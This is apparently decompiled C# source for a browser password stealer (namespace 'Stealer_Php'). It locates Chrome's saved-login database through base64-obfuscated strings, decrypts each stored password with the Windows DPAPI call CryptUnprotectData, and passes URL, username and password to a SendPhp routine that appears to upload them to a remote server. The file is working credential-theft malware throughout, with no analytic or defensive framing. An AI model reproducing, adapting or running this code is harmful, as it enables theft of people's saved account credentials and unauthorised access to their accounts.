using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Stealer_Php.My;

namespace Stealer_Php;

[StandardModule]
internal sealed class Chrome
{
	[Flags]
	public enum CryptProtectPromptFlags
	{
		CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
		CRYPTPROTECT_PROMPT_ON_PROTECT = 2
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct CRYPTPROTECT_PROMPTSTRUCT
	{
		public int cbSize;

		public CryptProtectPromptFlags dwPromptFlags;

		public IntPtr hwndApp;

		public string szPrompt;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct DATA_BLOB
	{
		public int cbData;

		public IntPtr pbData;
	}

	public static void Gchrome()
	{
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			try
			{
				string text = Conversions.ToString(Operators.AddObject((object)Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), TJaRovkTENaVCbFmepBbHsv("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==")));
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable(Conversions.ToString(TJaRovkTENaVCbFmepBbHsv("bG9naW5z")));
				if (!File.Exists(text))
				{
					return;
				}
				int num = sQLiteHandler.GetRowCount() - 1;
				for (int i = 0; i <= num; i++)
				{
					object[] array = new object[2]
					{
						i,
						RuntimeHelpers.GetObjectValue(TJaRovkTENaVCbFmepBbHsv("b3JpZ2luX3VybA=="))
					};
					object[] array2 = array;
					bool[] array3 = new bool[2] { true, false };
					object obj = NewLateBinding.LateGet((object)sQLiteHandler, (Type)null, "GetValue", array2, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(int));
					}
					string text2 = Conversions.ToString(obj);
					object[] array4 = new object[2]
					{
						i,
						RuntimeHelpers.GetObjectValue(TJaRovkTENaVCbFmepBbHsv("dXNlcm5hbWVfdmFsdWU="))
					};
					object[] array5 = array4;
					array3 = new bool[2] { true, false };
					object obj2 = NewLateBinding.LateGet((object)sQLiteHandler, (Type)null, "GetValue", array5, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(int));
					}
					string text3 = Conversions.ToString(obj2);
					Encoding @default = Encoding.Default;
					object[] array6 = new object[1];
					array4 = new object[2]
					{
						i,
						RuntimeHelpers.GetObjectValue(TJaRovkTENaVCbFmepBbHsv("cGFzc3dvcmRfdmFsdWU="))
					};
					object[] array7 = array4;
					array3 = new bool[2] { true, false };
					object obj3 = NewLateBinding.LateGet((object)sQLiteHandler, (Type)null, "GetValue", array7, (string[])null, (Type[])null, array3);
					if (array3[0])
					{
						i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(int));
					}
					array6[0] = RuntimeHelpers.GetObjectValue(obj3);
					string text4 = Decrypt((byte[])NewLateBinding.LateGet((object)@default, (Type)null, "GetBytes", array6, (string[])null, (Type[])null, (bool[])null));
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						p.OL = Conversions.ToString(Operators.AddObject((object)p.OL, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"\r\n", TJaRovkTENaVCbFmepBbHsv("QXBwbGljYXRpb246IEdvb2dsZSBDaHJvbWU=")), (object)"\r\n"), TJaRovkTENaVCbFmepBbHsv("VXJsOiA=")), (object)text2), (object)"\r\n"), TJaRovkTENaVCbFmepBbHsv("VXNlcm5hbWU6IA==")), (object)text3), (object)"\r\n"), TJaRovkTENaVCbFmepBbHsv("UGFzc3dvcmQ6IA==")), (object)text4), (object)"\r\n"), (object)"\r\n")));
						MyProject.Forms.Form1.SendPhp(Conversions.ToInteger(TJaRovkTENaVCbFmepBbHsv("MTI=")), text2, text3, text4);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static object TJaRovkTENaVCbFmepBbHsv(string LKpgQudKvkGOmRsCD)
	{
		byte[] bytes = Convert.FromBase64String(LKpgQudKvkGOmRsCD);
		return Encoding.UTF8.GetString(bytes);
	}

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

	public static string Decrypt(byte[] Datas)
	{
		DATA_BLOB pDataIn = default(DATA_BLOB);
		DATA_BLOB pDataOut = default(DATA_BLOB);
		GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
		pDataIn.pbData = gCHandle.AddrOfPinnedObject();
		pDataIn.cbData = Datas.Length;
		gCHandle.Free();
		DATA_BLOB dATA_BLOB = default(DATA_BLOB);
		DATA_BLOB pOptionalEntropy = dATA_BLOB;
		CRYPTPROTECT_PROMPTSTRUCT cRYPTPROTECT_PROMPTSTRUCT = default(CRYPTPROTECT_PROMPTSTRUCT);
		CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = cRYPTPROTECT_PROMPTSTRUCT;
		IntPtr pvReserved = default(IntPtr);
		CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, pvReserved, ref pPromptStruct, 0, ref pDataOut);
		checked
		{
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}
}
